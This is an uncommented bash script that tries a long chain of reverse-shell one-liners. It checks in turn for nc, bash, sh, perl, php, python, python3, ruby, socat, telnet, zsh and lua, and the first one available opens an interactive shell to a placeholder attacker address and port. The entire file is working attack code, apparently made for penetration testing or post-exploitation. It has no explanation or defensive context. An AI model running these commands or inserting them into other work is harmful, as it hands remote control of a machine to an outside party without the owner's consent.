
#!/bin/bash

if [ $(which nc >/dev/null ; echo $?) == 0 ];then
    nc -e /bin/bash <LHOST-IP-ADDRESS> <LPORT>; 
    nc -e /bin/sh <LHOST-IP-ADDRESS> <LPORT>;
    nc -c sh <LHOST-IP-ADDRESS> <LPORT>;
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <LHOST-IP-ADDRESS> <LPORT> >/tmp/f;

elif [ $(which bash >/dev/null ; echo $?) == 0 ];then
    bash -c 'exec bash -i &>/dev/tcp/<LHOST-IP-ADDRESS>/<LPORT> <&1';

elif [ $(which sh >/dev/null ; echo $?) == 0 ];then
    sh -i >& /dev/tcp/<LHOST-IP-ADDRESS>/<LPORT> 0>&1;
    0<&196;exec 196<>/dev/tcp/<LHOST-IP-ADDRESS>/<LPORT>; sh <&196 >&196 2>&196;
    exec 5<>/dev/tcp/<LHOST-IP-ADDRESS>/<LPORT>;cat <&5 | while read line; do $line 2>&5 >&5; done;
    sh -i 5<> /dev/tcp/<LHOST-IP-ADDRESS>/<LPORT> 0<&5 1>&5 2>&5;
    sh -i >& /dev/udp/<LHOST-IP-ADDRESS>/<LPORT> 0>&1;

elif [ $(which perl >/dev/null ; echo $?) == 0 ];then
    perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<LHOST-IP-ADDRESS>:<LPORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;';

elif [ $(which php >/dev/null ; echo $?) == 0 ];then
    php -r '$sock=fsockopen("<LHOST-IP-ADDRESS>",<LPORT>);exec("sh <&3 >&3 2>&3");';
    php -r '$sock=fsockopen("<LHOST-IP-ADDRESS>",<LPORT>);shell_exec("sh <&3 >&3 2>&3");';
    php -r '$sock=fsockopen("<LHOST-IP-ADDRESS>",<LPORT>);system("sh <&3 >&3 2>&3");';

elif [ $(which python >/dev/null ; echo $?) == 0 ];then
    export RHOST="<LHOST-IP-ADDRESS>";export RPORT=<LPORT>;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")';
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST-IP-ADDRESS>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")';

elif [ $(which python3 >/dev/null ; echo $?) == 0 ];then
    export RHOST="<LHOST-IP-ADDRESS>";export RPORT=<LPORT>;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")';
    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST-IP-ADDRESS>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")';

elif [ $(which ruby >/dev/null ; echo $?) == 0 ];then
    ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("<LHOST-IP-ADDRESS>",<LPORT>))';

elif [ $(which socat >/dev/null ; echo $?) == 0 ];then
    socat TCP:<LHOST-IP-ADDRESS>:<LPORT> EXEC:sh

elif [ $(which telnet >/dev/null ; echo $?) == 0 ];then
    TF=$(mktemp -u);mkfifo $TF && telnet <LHOST-IP-ADDRESS> <LPORT> 0<$TF | sh 1>$TF;

elif [ $(which zsh >/dev/null ; echo $?) == 0 ];then
    zsh -c 'zmodload zsh/net/tcp && ztcp <LHOST-IP-ADDRESS> <LPORT> && zsh >&$REPLY 2>&$REPLY 0>&$REPLY';

elif [ $(which lua >/dev/null ; echo $?) == 0 ];then
    lua -e "require('socket');require('os');t=socket.tcp();t:connect('<LHOST-IP-ADDRESS>','<LPORT>');os.execute('sh -i <&3 >&3 2>&3');";
fi
